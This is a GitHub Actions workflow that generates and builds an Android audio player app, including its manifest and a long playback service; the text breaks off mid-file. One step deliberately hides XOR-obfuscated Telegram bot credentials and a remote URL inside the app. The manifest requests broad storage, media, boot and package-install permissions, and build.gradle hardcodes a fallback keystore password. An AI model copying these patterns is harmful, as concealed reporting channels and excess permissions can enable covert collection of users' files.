name: Build & Release MJ Audio Player APK

on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  contents: write

env:
  APP_VERSION_NAME: '1.2'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Generate Custom App Icons
        run: |
          cat > GenerateIcon.java <<'EOF'
          import java.awt.*;
          import java.awt.geom.*;
          import java.awt.image.BufferedImage;
          import java.io.File;
          import javax.imageio.ImageIO;

          public class GenerateIcon {
              public static void main(String[] args) throws Exception {
                  String[] densities = {"mdpi", "hdpi", "xhdpi", "xxhdpi", "xxxhdpi"};
                  int[] sizes = {48, 72, 96, 144, 192};

                  for (int i = 0; i < densities.length; i++) {
                      File dir = new File("app/src/main/res/mipmap-" + densities[i]);
                      dir.mkdirs();
                      writeIcon(sizes[i], false, new File(dir, "ic_launcher.png"));
                      writeIcon(sizes[i], true, new File(dir, "ic_launcher_round.png"));
                  }
              }

              private static void writeIcon(int size, boolean isRound, File outFile) throws Exception {
                  BufferedImage img = new BufferedImage(size, size, BufferedImage.TYPE_INT_ARGB);
                  Graphics2D g = img.createGraphics();
                  g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                  g.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);

                  float pad = size * 0.04f;
                  float w = size - (pad * 2f);

                  Shape bgShape = isRound
                          ? new Ellipse2D.Float(pad, pad, w, w)
                          : new RoundRectangle2D.Float(pad, pad, w, w, size * 0.24f, size * 0.24f);

                  GradientPaint grad = new GradientPaint(
                          0, 0, new Color(0x0D, 0x47, 0xA1),
                          size, size, new Color(0x00, 0xBC, 0xD4));
                  g.setPaint(grad);
                  g.fill(bgShape);

                  g.setClip(bgShape);
                  g.setColor(new Color(255, 255, 255, 38));
                  g.setStroke(new BasicStroke(Math.max(1.5f, size * 0.025f)));
                  g.draw(new Ellipse2D.Float(size * 0.14f, size * 0.14f, size * 0.72f, size * 0.72f));

                  g.setColor(Color.WHITE);
                  float strokeW = Math.max(2.5f, size * 0.075f);
                  g.setStroke(new BasicStroke(strokeW, BasicStroke.CAP_ROUND, BasicStroke.JOIN_ROUND));
                  float arcPad = size * 0.22f;
                  float arcSize = size - (arcPad * 2f);
                  g.draw(new Arc2D.Float(arcPad, arcPad, arcSize, arcSize, 0, 180, Arc2D.OPEN));

                  float cupW = size * 0.12f;
                  float cupH = size * 0.24f;
                  float cupY = size * 0.50f;
                  float cupArc = size * 0.06f;
                  g.fill(new RoundRectangle2D.Float(arcPad - (cupW * 0.45f), cupY, cupW, cupH, cupArc, cupArc));
                  g.fill(new RoundRectangle2D.Float(size - arcPad - (cupW * 0.55f), cupY, cupW, cupH, cupArc, cupArc));

                  Path2D.Float play = new Path2D.Float();
                  play.moveTo(size * 0.43f, size * 0.44f);
                  play.lineTo(size * 0.64f, size * 0.56f);
                  play.lineTo(size * 0.43f, size * 0.68f);
                  play.closePath();
                  g.fill(play);

                  g.dispose();
                  ImageIO.write(img, "PNG", outFile);
              }
          }
          EOF
          java -Djava.awt.headless=true GenerateIcon.java
          rm -f GenerateIcon.java

      - name: Generate Hidden Feedback Config
        env:
          FB_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          FB_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
          FB_URL: ${{ secrets.FEEDBACK_API_URL }}
        run: |
          mkdir -p app/src/main/java/com/mjaudio/player
          cat > GenFeedbackConfig.java <<'EOF'
          import java.io.FileOutputStream;
          import java.nio.charset.StandardCharsets;
          import java.security.SecureRandom;

          public class GenFeedbackConfig {
              private static String encode(String input, byte[] mask) {
                  if (input == null || input.trim().isEmpty()) return "new byte[0]";
                  byte[] data = input.trim().getBytes(StandardCharsets.UTF_8);
                  StringBuilder sb = new StringBuilder("new byte[]{");
                  for (int i = 0; i < data.length; i++) {
                      if (i > 0) sb.append(",");
                      sb.append((byte) (data[i] ^ mask[i % mask.length]));
                  }
                  sb.append("}");
                  return sb.toString();
              }

              private static String raw(byte[] data) {
                  StringBuilder sb = new StringBuilder("new byte[]{");
                  for (int i = 0; i < data.length; i++) {
                      if (i > 0) sb.append(",");
                      sb.append(data[i]);
                  }
                  sb.append("}");
                  return sb.toString();
              }

              public static void main(String[] args) throws Exception {
                  byte[] mask = new byte[24];
                  new SecureRandom().nextBytes(mask);
                  String t = System.getenv("FB_TOKEN");
                  String c = System.getenv("FB_CHAT");
                  String u = System.getenv("FB_URL");

                  String src =
                          "package com.mjaudio.player;\n" +
                          "import java.nio.charset.StandardCharsets;\n" +
                          "public class FeedbackConfig {\n" +
                          "    private static final byte[] K = " + raw(mask) + ";\n" +
                          "    private static final byte[] A = " + encode(t, mask) + ";\n" +
                          "    private static final byte[] B = " + encode(c, mask) + ";\n" +
                          "    private static final byte[] C = " + encode(u, mask) + ";\n" +
                          "    private static String d(byte[] s) {\n" +
                          "        if (s == null || s.length == 0) return \"\";\n" +
                          "        byte[] o = new byte[s.length];\n" +
                          "        for (int i = 0; i < s.length; i++) o[i] = (byte) (s[i] ^ K[i % K.length]);\n" +
                          "        return new String(o, StandardCharsets.UTF_8);\n" +
                          "    }\n" +
                          "    public static String getA() { return d(A); }\n" +
                          "    public static String getB() { return d(B); }\n" +
                          "    public static String getC() { return d(C); }\n" +
                          "}\n";

                  try (FileOutputStream fos = new FileOutputStream("app/src/main/java/com/mjaudio/player/FeedbackConfig.java")) {
                      fos.write(src.getBytes(StandardCharsets.UTF_8));
                  }
              }
          }
          EOF
          java GenFeedbackConfig.java
          rm -f GenFeedbackConfig.java

      - name: Create MJ Audio Player Project
        run: |
          mkdir -p app/src/main/java/com/mjaudio/player
          mkdir -p app/src/main/res/drawable

          cat > settings.gradle <<'EOF'
          pluginManagement {
            repositories {
              google()
              mavenCentral()
              gradlePluginPortal()
            }
          }
          dependencyResolutionManagement {
            repositories {
              google()
              mavenCentral()
            }
          }
          rootProject.name = "MJAudioPlayer"
          include ':app'
          EOF

          cat > gradle.properties <<'EOF'
          android.useAndroidX=true
          org.gradle.jvmargs=-Xmx2g
          EOF

          cat > app/build.gradle <<'EOF'
          plugins {
            id 'com.android.application' version '8.2.2'
          }

          def appVerCode = Integer.parseInt(System.getenv("GITHUB_RUN_NUMBER") ?: "1")
          def appVerName = System.getenv("APP_VERSION_NAME") ?: "1.2"
          def ksStorePass = System.getenv("KEYSTORE_PASSWORD") ?: "MJAud1oReleaseKey2026"
          def ksKeyAlias = System.getenv("KEY_ALIAS") ?: "mj_audio_key"
          def ksKeyPass = System.getenv("KEY_PASSWORD") ?: "MJAud1oReleaseKey2026"

          android {
            namespace 'com.mjaudio.player'
            compileSdk 34
            defaultConfig {
              applicationId 'com.mjaudio.player'
              minSdk 24
              targetSdk 34
              versionCode appVerCode
              versionName appVerName
            }
            compileOptions {
              sourceCompatibility JavaVersion.VERSION_17
              targetCompatibility JavaVersion.VERSION_17
            }
            signingConfigs {
              release {
                storeFile file("release.keystore")
                storePassword ksStorePass
                keyAlias ksKeyAlias
                keyPassword ksKeyPass
                enableV1Signing true
                enableV2Signing true
              }
            }
            buildTypes {
              release {
                signingConfig signingConfigs.release
                minifyEnabled false
                shrinkResources false
                debuggable false
              }
            }
            lint {
              checkReleaseBuilds false
              abortOnError false
            }
          }
          EOF

          cat > app/src/main/res/drawable/ic_stat_music.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="24dp"
              android:height="24dp"
              android:viewportWidth="24"
              android:viewportHeight="24">
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M12,3v10.55c-0.59,-0.34 -1.27,-0.55 -2,-0.55 -2.21,0 -4,1.79 -4,4s1.79,4 4,4 4,-1.79 4,-4V7h4V3h-6z" />
          </vector>
          EOF

          cat > app/src/main/AndroidManifest.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
            <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
            <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
            <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
            <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
            <uses-permission android:name="android.permission.WAKE_LOCK" />
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
            <uses-permission android:name="android.permission.VIBRATE" />
            <uses-permission android:name="android.permission.BLUETOOTH" />
            <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
            <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

            <application
              android:label="MJ Audio Player"
              android:icon="@mipmap/ic_launcher"
              android:roundIcon="@mipmap/ic_launcher_round"
              android:theme="@android:style/Theme.Material.NoActionBar"
              android:requestLegacyExternalStorage="true"
              android:usesCleartextTraffic="true">
              <activity
                android:name=".MainActivity"
                android:exported="true"
                android:launchMode="singleTop"
                android:configChanges="orientation|screenSize|keyboardHidden">
                <intent-filter>
                  <action android:name="android.intent.action.MAIN" />
                  <category android:name="android.intent.category.LAUNCHER" />
                </intent-filter>
              </activity>

              <service
                android:name=".MediaPlaybackService"
                android:exported="false"
                android:foregroundServiceType="mediaPlayback" />

              <receiver
                android:name=".MediaControlReceiver"
                android:exported="false" />
            </application>
          </manifest>
          EOF

          cat > app/src/main/java/com/mjaudio/player/UpdateConfig.java <<EOF
          package com.mjaudio.player;

          public class UpdateConfig {
              public static final String GITHUB_REPO = "${GITHUB_REPOSITORY}";
              public static final String VERSION_NAME = "${APP_VERSION_NAME}";
              public static final int BUILD_NUMBER = ${GITHUB_RUN_NUMBER};
              public static final String CURRENT_TAG = "v${APP_VERSION_NAME}-build-${GITHUB_RUN_NUMBER}";
          }
          EOF

          cat > app/src/main/java/com/mjaudio/player/MediaControlReceiver.java <<'EOF'
          package com.mjaudio.player;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;

          public class MediaControlReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (intent == null || intent.getAction() == null) return;
                  MediaPlaybackService.handleAction(context.getApplicationContext(), intent.getAction());
              }
          }
          EOF

          cat > app/src/main/java/com/mjaudio/player/MediaPlaybackService.java <<'EOF'
          package com.mjaudio.player;

          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.app.PendingIntent;
          import android.app.Service;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.content.IntentFilter;
          import android.content.SharedPreferences;
          import android.content.pm.ServiceInfo;
          import android.media.AudioManager;
          import android.media.MediaMetadata;
          import android.media.MediaPlayer;
          import android.media.PlaybackParams;
          import android.media.audiofx.BassBoost;
          import android.media.audiofx.Equalizer;
          import android.media.audiofx.LoudnessEnhancer;
          import android.media.audiofx.Virtualizer;
          import android.media.session.MediaSession;
          import android.media.session.PlaybackState;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.IBinder;
          import android.os.Looper;
          import android.os.PowerManager;
          import android.widget.Toast;

          import java.io.File;
          import java.util.ArrayList;
          import java.util.List;

          public class MediaPlaybackService extends Service {

              public static final String CHANNEL_ID = "audio_channel";
              public static final int NOTIFICATION_ID = 111;

              public static final String ACTION_START_PLAYBACK = "com.mjaudio.player.START_PLAYBACK";
              public static final String ACTION_PREV = "JAHBAZ_ACTION_PREV";
              public static final String ACTION_REWIND = "JAHBAZ_ACTION_REWIND";
              public static final String ACTION_PLAY = "JAHBAZ_ACTION_PLAY";
              public static final String ACTION_FORWARD = "JAHBAZ_ACTION_FORWARD";
              public static final String ACTION_NEXT = "JAHBAZ_ACTION_NEXT";
              public static final String ACTION_CLOSE = "JAHBAZ_ACTION_CLOSE";

              public static final String CUSTOM_ACTION_REWIND = "MJ_CUSTOM_REWIND";
              public static final String CUSTOM_ACTION_FORWARD = "MJ_CUSTOM_FORWARD";
              public static final String CUSTOM_ACTION_CLOSE = "MJ_CUSTOM_CLOSE";

              public interface PlaybackListener {
                  void onPlaybackStateChanged();
              }

              public static class AudioItem {
                  public String name;
                  public String path;
                  public long dateAdded;
                  public long size;
                  public long duration;

                  public AudioItem(String name, String path, long dateAdded, long size, long duration) {
                      this.name = name;
                      this.path = path;
                      this.dateAdded = dateAdded;
                      this.size = size;
                      this.duration = duration;
                  }
              }

              public static MediaPlaybackService instance;
              public static PlaybackListener uiListener;

              public static MediaPlayer mediaPlayer;
              public static MediaPlayer echoPlayer;
              public static MediaSession mediaSession;
              public static Equalizer globalEq;
              public static BassBoost globalBass;
              public static Virtualizer globalVirt;
              public static LoudnessEnhancer globalLoudness;

              public static List<AudioItem> displayList = new ArrayList<>();
              public static int currentIndex = -1;
              public static boolean isPlaying = false;
              public static String lastStatusText = "No Audio Selected";

              public static int skipDuration = 10000;
              public static boolean backgroundPlay = true;
              public static boolean singleLoop = false;
              public static float currentPlaybackSpeed = 1.0f;
              public static String currentVoiceEffect = "Normal";
              public static int volumeBoostLevel = 0;
              public static int currentEqPreset = -1;
              public static final int[] customEqBands = new int[]{0, 0, 0, 0, 0};

              // A-B Repeat state (persists in background)
              public static int abRepeatState = 0; // 0: Off, 1: A Set, 2: B Set
              public static int abPointA = 0;
              public static int abPointB = 0;

              private static final Handler mainHandler = new Handler(Looper.getMainLooper());
              private static final Handler sleepTimerHandler = new Handler(Looper.getMainLooper());
              private static Runnable sleepTimerRunnable = null;

              private final Handler bgTickHandler = new Handler(Looper.getMainLooper());
              private Runnable bgTickRunnable;
              private BroadcastReceiver noisyReceiver;
              private AudioManager.OnAudioFocusChangeListener focusChangeListener;

              @Override
              public void onCreate() {
                  super.onCreate();
                  instance = this;
                  createNotificationChannel(this);
                  ensureMediaPlayer(this);
                  ensureMediaSession(this);
                  setupAudioFocus();
                  registerNoisyReceiver();
                  startBackgroundTick();
              }

              @Override
              public int onStartCommand(Intent intent, int flags, int startId) {
                  createNotificationChannel(this);
                  ensureMediaPlayer(this);
                  ensureMediaSession(this);

                  if (intent != null && intent.getAction() != null) {
                      String action = intent.getAction();
                      if (!ACTION_START_PLAYBACK.equals(action)) {
                          handleAction(this, action);
                          return START_STICKY;
                      }
                  }

                  AudioItem item = getCurrentItem();
                  Notification notif = buildNotification(this, item, isPlaying);
                  if (isPlaying) {
                      startForegroundCompat(notif);
                  } else if (intent != null && ACTION_START_PLAYBACK.equals(intent.getAction())) {
                      startForegroundCompat(notif);
                      stopForeground(Service.STOP_FOREGROUND_DETACH);
                  }
                  return START_STICKY;
              }

              @Override
              public IBinder onBind(Intent intent) {
                  return null;
              }

              @Override
              public void onTaskRemoved(Intent rootIntent) {
                  super.onTaskRemoved(rootIntent);
                  if (!isPlaying || !backgroundPlay) {
                      stopPlaybackAndService(this);
                  }
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  if (bgTickRunnable != null) {
                      bgTickHandler.removeCallbacks(bgTickRunnable);
                  }
                  try {
                      if (noisyReceiver != null) {
                          unregisterReceiver(noisyReceiver);
                      }
                  } catch (Throwable ignored) {}
                  try {
                      AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                      if (am != null && focusChangeListener != null) {
                          am.abandonAudioFocus(focusChangeListener);
                      }
                  } catch (Throwable ignored) {}
                  instance = null;
              }

              public static void handleAction(final Context ctx, final String action) {
                  if (action == null) return;
                  final Context appCtx = ctx.getApplicationContext();
                  mainHandler.post(() -> {
                      try {
                          if (ACTION_PREV.equals(action)) {
                              playPreviousTrack(appCtx);
                          } else if (ACTION_REWIND.equals(action) || CUSTOM_ACTION_REWIND.equals(action)) {
                              seekAndUpdate(appCtx, -skipDuration);
                          } else if (ACTION_PLAY.equals(action)) {
                              togglePlayPause(appCtx);
                          } else if (ACTION_FORWARD.equals(action) || CUSTOM_ACTION_FORWARD.equals(action)) {
                              seekAndUpdate(appCtx, skipDuration);
                          } else if (ACTION_NEXT.equals(action)) {
                              playNextTrack(appCtx);
                          } else if (ACTION_CLOSE.equals(action) || CUSTOM_ACTION_CLOSE.equals(action)) {
                              stopPlaybackAndService(appCtx);
                          }
                      } catch (Throwable ignored) {}
                  });
              }

              private void startForegroundCompat(Notification notif) {
                  try {
                      if (Build.VERSION.SDK_INT >= 29) {
                          startForeground(NOTIFICATION_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
                      } else {
                          startForeground(NOTIFICATION_ID, notif);
                      }
                  } catch (Throwable ignored) {}
              }

              private void startBackgroundTick() {
                  bgTickRunnable = new Runnable() {
                      @Override
                      public void run() {
                          try {
                              if (mediaPlayer != null && mediaPlayer.isPlaying()) {
                                  int current = mediaPlayer.getCurrentPosition();
                                  if (abRepeatState == 2 && current >= abPointB) {
                                      mediaPlayer.seekTo(abPointA);
                                      current = abPointA;
                                  }
                                  AudioItem item = getCurrentItem();
                                  if (item != null) {
                                      getPrefs(MediaPlaybackService.this).edit()
                                              .putInt("pos_" + item.path, current).apply();
                                  }
                              }
                          } catch (Throwable ignored) {}
                          bgTickHandler.postDelayed(this, 250);
                      }
                  };
                  bgTickHandler.postDelayed(bgTickRunnable, 250);
              }

              public static void ensureMediaSession(final Context ctx) {
                  try {
                      if (Build.VERSION.SDK_INT >= 21) {
                          final Context appCtx = ctx.getApplicationContext();
                          if (mediaSession == null) {
                              mediaSession = new MediaSession(appCtx, "MJ_Audio_Session");
                              mediaSession.setFlags(
                                      MediaSession.FLAG_HANDLES_MEDIA_BUTTONS
                                              | MediaSession.FLAG_HANDLES_TRANSPORT_CONTROLS
                              );
                              mediaSession.setCallback(new MediaSession.Callback() {
                                  @Override
                                  public void onPlay() {
                                      if (!isPlaying) togglePlayPause(appCtx);
                                  }

                                  @Override
                                  public void onPause() {
                                      if (isPlaying) togglePlayPause(appCtx);
                                  }

                                  @Override
                                  public void onSkipToNext() {
                                      playNextTrack(appCtx);
                                  }

                                  @Override
                                  public void onSkipToPrevious() {
                                      playPreviousTrack(appCtx);
                                  }

                                  @Override
                                  public void onFastForward() {
                                      seekAndUpdate(appCtx, skipDuration);
                                  }

                                  @Override
                                  public void onRewind() {
                                      seekAndUpdate(appCtx, -skipDuration);
                                  }

                                  @Override
                                  public void onSeekTo(long pos) {
                                      seekToPosition(appCtx, (int) pos);
                                  }

                                  @Override
                                  public void onStop() {
                                      stopPlaybackAndService(appCtx);
                                  }

                                  @Override
                                  public void onCustomAction(String action, Bundle extras) {
                                      handleAction(appCtx, action);
                                  }
                              });
                          }
                          if (!mediaSession.isActive()) {
                              mediaSession.setActive(true);
                          }
                      }
                  } catch (Throwable ignored) {}
              }

              private void setupAudioFocus() {
                  try {
                      AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                      focusChangeListener = focusChange -> {
                          try {
                              if (focusChange == AudioManager.AUDIOFOCUS_LOSS
                                      || focusChange == AudioManager.AUDIOFOCUS_LOSS_TRANSIENT) {
                                  if (mediaPlayer != null && mediaPlayer.isPlaying()) {
                                      togglePlayPause(MediaPlaybackService.this);
                                  }
                              }
                          } catch (Throwable ignored) {}
                      };
                      if (audioManager != null) {
                          audioManager.requestAudioFocus(focusChangeListener,
                                  AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN);
                      }
                  } catch (Throwable ignored) {}
              }

              private void registerNoisyReceiver() {
                  noisyReceiver = new BroadcastReceiver() {
                      @Override
                      public void onReceive(Context context, Intent intent) {
                          try {
                              if (intent != null && AudioManager.ACTION_AUDIO_BECOMING_NOISY.equals(intent.getAction())) {
                                  if (mediaPlayer != null && mediaPlayer.isPlaying()) {
                                      togglePlayPause(MediaPlaybackService.this);
                                  }
                              }
                          } catch (Throwable ignored) {}
                      }
                  };
                  IntentFilter filter = new IntentFilter(AudioManager.ACTION_AUDIO_BECOMING_NOISY);
                  try {
                      if (Build.VERSION.SDK_INT >= 33) {
                          registerReceiver(noisyReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
                      } else {
                          registerReceiver(noisyReceiver, filter);
                      }
                  } catch (Throwable ignored) {}
              }

              public static SharedPreferences getPrefs(Context ctx) {
                  return ctx.getApplicationContext().getSharedPreferences("AudioPlayerProPrefs", Context.MODE_PRIVATE);
              }

              public static SharedPreferences getTagsPrefs(Context ctx) {
                  return ctx.getApplicationContext().getSharedPreferences("AudioTagsPrefs", Context.MODE_PRIVATE);
              }

              public static SharedPreferences getRecentPrefs(Context ctx) {
                  return ctx.getApplicationContext().getSharedPreferences("AudioRecentPrefs", Context.MODE_PRIVATE);
              }

              public static void createNotificationChannel(Context ctx) {
                  try {
                      if (Build.VERSION.SDK_INT >= 26) {
                          NotificationChannel channel = new NotificationChannel(
                                  CHANNEL_ID, "MJ Audio Playback", NotificationManager.IMPORTANCE_LOW);
                          NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
                          if (nm != null) nm.createNotificationChannel(channel);
                      }
                  } catch (Throwable ignored) {}
              }

              public static AudioItem getCurrentItem() {
                  if (currentIndex >= 0 && currentIndex < displayList.size()) {
                      return displayList.get(currentIndex);
                  }
                  return null;
              }

              public static void ensureMediaPlayer(final Context ctx) {
                  final Context appCtx = ctx.getApplicationContext();
                  if (mediaPlayer == null) {
                      mediaPlayer = new MediaPlayer();
                      try {
                          mediaPlayer.setWakeMode(appCtx, PowerManager.PARTIAL_WAKE_LOCK);
                      } catch (Throwable ignored) {}
                  }
                  mediaPlayer.setOnCompletionListener(mp -> {
                      stopEchoPlayer();
                      AudioItem curr = getCurrentItem();
                      if (curr != null) {
                          getPrefs(appCtx).edit().putInt("pos_" + curr.path, 0).apply();
                      }
                      if (singleLoop && currentIndex >= 0 && currentIndex < displayList.size()) {
                          playAudioAtIndex(appCtx, currentIndex);
                      } else if (currentIndex >= 0 && currentIndex < displayList.size() - 1) {
                          playAudioAtIndex(appCtx, currentIndex + 1);
                      } else {
                          isPlaying = false;
                          lastStatusText = "Playback Finished";
                          refreshForegroundNotification(appCtx);
                          notifyUi();
                      }
                  });
              }

              public static void notifyUi() {
                  mainHandler.post(() -> {
                      if (uiListener != null) {
                          try { uiListener.onPlaybackStateChanged(); } catch (Throwable ignored) {}
                      }
                  });
              }

              public static void stopEchoPlayer() {
                  try {
                      if (echoPlayer != null) {
                          if (echoPlayer.isPlaying()) echoPlayer.stop();
                          echoPlayer.reset();
                          echoPlayer.release();
                          echoPlayer = null;
                      }
                  } catch (Throwable ignored) {}
              }

              public static void syncEchoPlayer(int delayMs, float vol, float speed, float pitch) {
                  if (delayMs <= 0) {
                      stopEchoPlayer();
                      return;
                  }
                  try {
                      AudioItem item = getCurrentItem();
                      if (mediaPlayer == null || !mediaPlayer.isPlaying() || item == null) {
                          stopEchoPlayer();
                          return;
                      }
                      if (echoPlayer == null) {
                          echoPlayer = new MediaPlayer();
                          echoPlayer.setDataSource(item.path);
                          echoPlayer.prepare();
                      }
                      echoPlayer.setLooping(singleLoop);
                      echoPlayer.setVolume(vol, vol);
                      int targetPos = Math.max(0, mediaPlayer.getCurrentPosition() - delayMs);
                      echoPlayer.seekTo(targetPos);
                      if (!echoPlayer.isPlaying()) {
                          echoPlayer.start();
                      }
                      if (Build.VERSION.SDK_INT >= 23) {
                          PlaybackParams ep = echoPlayer.getPlaybackParams();
                          ep.setSpeed(speed);
                          ep.setPitch(pitch);
                          echoPlayer.setPlaybackParams(ep);
                      }
                  } catch (Throwable ignored) {}
              }

              public static void applyVoiceAndSpeed() {
                  try {
                      if (Build.VERSION.SDK_INT >= 23 && mediaPlayer != null && mediaPlayer.isPlaying()) {
                          int sessionId = mediaPlayer.getAudioSessionId();
                          try { if (globalEq != null) globalEq.setEnabled(false); } catch (Throwable ignored) {}
                          try { if (globalBass != null) globalBass.setEnabled(false); } catch (Throwable ignored) {}
                          try { if (globalVirt != null) globalVirt.setEnabled(false); } catch (Throwable ignored) {}
                          try { if (globalLoudness != null) globalLoudness.setEnabled(false); } catch (Throwable ignored) {}

                          String e = currentVoiceEffect;
                          float targetPitch = 1.0f;
                          float speedMultiplier = 1.0f;
                          int[] eqBands = null;
                          int useBass = 0;
                          int useVirt = 0;
                          int echoDelay = 0;
                          float echoVol = 0.0f;

                          if ("Custom".equals(e)) { eqBands = customEqBands; }
                          else if ("Baby".equals(e)) { targetPitch = 1.45f; eqBands = new int[]{-1000, -500, 500, 1200, 1500}; }
                          else if ("Chipmunk".equals(e)) { targetPitch = 1.8f; eqBands = new int[]{-1500, 0, 800, 1500, 1500}; }
                          else if ("Helium".equals(e)) { targetPitch = 1.95f; }
                          else if ("Bee".equals(e)) { targetPitch = 2.1f; eqBands = new int[]{-1500, -1500, 1000, 1500, 1500}; }
                          else if ("Female".equals(e)) { targetPitch = 1.35f; eqBands = new int[]{-1500, -600, 900, 1500, 1200}; }
                          else if ("Male".equals(e)) { targetPitch = 0.80f; eqBands = new int[]{1200, 800, 0, -600, -1000}; }
                          else if ("Deep / Monster".equals(e)) { targetPitch = 0.62f; useBass = 1000; eqBands = new int[]{1500, 1200, -500, -1200, -1500}; }
                          else if ("Zombie".equals(e)) { targetPitch = 0.55f; speedMultiplier = 0.85f; eqBands = new int[]{1500, 800, -800, -1500, -1500}; }
                          else if ("Alien".equals(e)) { targetPitch = 1.35f; useVirt = 1000; eqBands = new int[]{-1500, 1500, -1500, 1500, -1500}; }
                          else if ("Robot".equals(e)) { targetPitch = 0.90f; useVirt = 1000; eqBands = new int[]{-1500, 1500, 1500, -1500, -1500}; }
                          else if ("Telephone".equals(e)) { targetPitch = 1.06f; eqBands = new int[]{-1500, -1200, 1500, -1200, -1500}; }
                          else if ("Old Radio".equals(e)) { targetPitch = 1.08f; speedMultiplier = 1.03f; eqBands = new int[]{-1500, 1200, 1500, -1000, -1500}; }
                          else if ("Cave".equals(e)) { targetPitch = 0.88f; useVirt = 1000; useBass = 1000; eqBands = new int[]{1500, 1000, -400, -1000, -1500}; }
                          else if ("Cathedral".equals(e)) { targetPitch = 0.94f; useVirt = 1000; useBass = 700; eqBands = new int[]{1200, 500, -500, 800, 1500}; }
                          else if ("Grand Canyon".equals(e)) { targetPitch = 0.92f; useVirt = 1000; useBass = 800; eqBands = new int[]{1400, 400, -600, 600, 1400}; }
                          else if ("Echo".equals(e)) { targetPitch = 1.0f; useVirt = 1000; eqBands = new int[]{600, 0, -400, 600, 1200}; echoDelay = 180; echoVol = 0.55f; }
                          else if ("Bathroom".equals(e)) { targetPitch = 1.04f; useVirt = 1000; eqBands = new int[]{-1200, 1400, 1200, -800, -1200}; }
                          else if ("Echo plus".equals(e)) { targetPitch = 0.96f; useVirt = 1000; useBass = 800; eqBands = new int[]{1200, 0, -500, 800, 1500}; echoDelay = 280; echoVol = 0.70f; }
                          else if ("Bass Boost".equals(e)) { targetPitch = 0.86f; useBass = 1000; eqBands = new int[]{1500, 1500, 200, -1200, -1500}; }
                          else if ("Treble Boost".equals(e)) { targetPitch = 1.15f; eqBands = new int[]{-1500, -1200, 400, 1500, 1500}; }
                          else if ("Mid Boost".equals(e)) { targetPitch = 1.08f; eqBands = new int[]{-1500, 800, 1500, 800, -1500}; }
                          else if ("Megaphone / BullHorn".equals(e)) { targetPitch = 1.14f; eqBands = new int[]{-1500, -1000, 1500, 1500, -1500}; }
                          else if ("Underwater".equals(e)) { targetPitch = 0.82f; useBass = 1000; eqBands = new int[]{1500, 800, -1500, -1500, -1500}; }
                          else if ("Dark Vader".equals(e)) { targetPitch = 0.68f; useBass = 800; useVirt = 800; eqBands = new int[]{1500, 1000, -500, -1000, -1500}; }
                          else if ("Dragon".equals(e)) { targetPitch = 0.52f; useBass = 1000; eqBands = new int[]{1500, 1200, 0, -1200, -1500}; }
                          else if ("Drunk".equals(e)) { targetPitch = 0.82f; speedMultiplier = 0.78f; }
                          else if ("Shrinking".equals(e)) { targetPitch = 1.65f; speedMultiplier = 1.15f; }
                          else if ("Battery Low".equals(e)) { targetPitch = 0.72f; speedMultiplier = 0.72f; }

                          float finalSpeed = Math.max(0.25f, Math.min(3.0f, currentPlaybackSpeed * speedMultiplier));
                          PlaybackParams params = mediaPlayer.getPlaybackParams();
                          params.setSpeed(finalSpeed);
                          params.setPitch(targetPitch);
                          mediaPlayer.setPlaybackParams(params);

                          if (eqBands != null) {
                              try {
                                  if (globalEq == null) globalEq = new Equalizer(0, sessionId);
                                  globalEq.setEnabled(true);
                                  short numBands = globalEq.getNumberOfBands();
                                  for (short i = 0; i < numBands; i++) {
                                      int idx = Math.min(eqBands.length - 1, i);
                                      short lvl = (short) eqBands[idx];
                                      try { globalEq.setBandLevel(i, lvl); } catch (Throwable ignored) {}
                                  }
                              } catch (Throwable ignored) {}
                          } else if (currentEqPreset >= 0) {
                              try {
                                  if (globalEq == null) globalEq = new Equalizer(0, sessionId);
                                  globalEq.setEnabled(true);
                                  globalEq.usePreset((short) currentEqPreset);
                              } catch (Throwable ignored) {}
                          }

                          if (useBass > 0) {
                              try {
                                  if (globalBass == null) globalBass = new BassBoost(0, sessionId);
